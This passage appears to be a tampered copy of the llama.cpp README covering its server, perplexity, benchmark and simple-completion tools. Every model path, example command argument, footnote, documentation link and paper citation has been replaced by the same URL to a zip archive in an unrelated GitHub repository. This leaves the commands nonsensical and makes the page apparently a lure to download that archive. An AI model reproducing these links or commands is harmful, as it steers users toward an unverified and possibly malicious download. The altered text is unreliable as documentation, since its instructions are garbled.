    llama-server -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip --reranking
    ```

    </details>

- <details>
    <summary>Constrain all outputs with a grammar</summary>

    ```bash
    # custom grammar
    llama-server -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip --grammar-file https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip

    # JSON
    llama-server -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip --grammar-file https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip
    ```

    </details>


## [`llama-perplexity`](examples/perplexity)

#### A tool for measuring the perplexity [^1][^2] (and other quality metrics) of a model over a given text.

- <details open>
    <summary>Measure the perplexity over a text file</summary>

    ```bash
    llama-perplexity -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip -f https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip

    # [1]15.2701,[2]5.4007,[3]5.3073,[4]6.2965,[5]5.8940,[6]5.6096,[7]5.7942,[8]4.9297, ...
    # Final estimate: PPL = 5.4007 +/- 0.67339
    ```

    </details>

- <details>
    <summary>Measure KL divergence</summary>

    ```bash
    # TODO
    ```

    </details>

[^1]: [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
[^2]: [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

## [`llama-bench`](example/bench)

#### Benchmark the performance of the inference for various parameters.

- <details open>
    <summary>Run default benchmark</summary>

    ```bash
    llama-bench -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip

    # Output:
    # | model               |       size |     params | backend    | threads |          test |                  t/s |
    # | ------------------- | ---------: | ---------: | ---------- | ------: | ------------: | -------------------: |
    # | qwen2 1.5B Q4_0     | 885.97 MiB |     1.54 B | Metal,BLAS |      16 |         pp512 |      5765.41 ± 20.55 |
    # | qwen2 1.5B Q4_0     | 885.97 MiB |     1.54 B | Metal,BLAS |      16 |         tg128 |        197.71 ± 0.81 |
    #
    # build: 3e0ba0e60 (4229)
    ```

    </details>


## [`llama-simple`](examples/simple)

#### A minimal example for implementing apps with `https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip`. Useful for developers.

- <details>
    <summary>Basic text completion</summary>

    ```bash
    llama-simple -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip

    # Hello my name is Kaitlyn and I am a 16 year old girl. I am a junior in high school and I am currently taking a class called "The Art of
    ```

    </details>


## Contributing

- Contributors can open PRs
- Collaborators can push to branches in the `https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip` repo and merge PRs into the `master` branch
- Collaborators will be invited based on contributions
- Any help with managing issues, PRs and projects is very appreciated!
- See [good first issues](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) for tasks suitable for first contributions
- Read the [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) for more information
- Make sure to read this: [Inference at the edge](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- A bit of backstory for those who are interested: [Changelog podcast](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

## Other documentation

- [main (cli)](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [server](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [GBNF grammars](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

#### Development documentation

- [How to build](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [Running on Docker](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [Build on Android](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [Performance troubleshooting](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [GGML tips & tricks](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

#### Seminal papers and background on the models

If your issue is with model generation quality, then please at least scan the following links and papers to understand the limitations of LLaMA models. This is especially important when choosing an appropriate model size and appreciating both the significant and subtle differences between LLaMA models and ChatGPT:
- LLaMA:
    - [Introducing LLaMA: A foundational, 65-billion-parameter large language model](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
    - [LLaMA: Open and Efficient Foundation Language Models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- GPT-3
    - [Language Models are Few-Shot Learners](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- GPT-3.5 / InstructGPT / ChatGPT:
    - [Aligning language models to follow instructions](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
    - [Training language models to follow instructions with human feedback](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

#### References

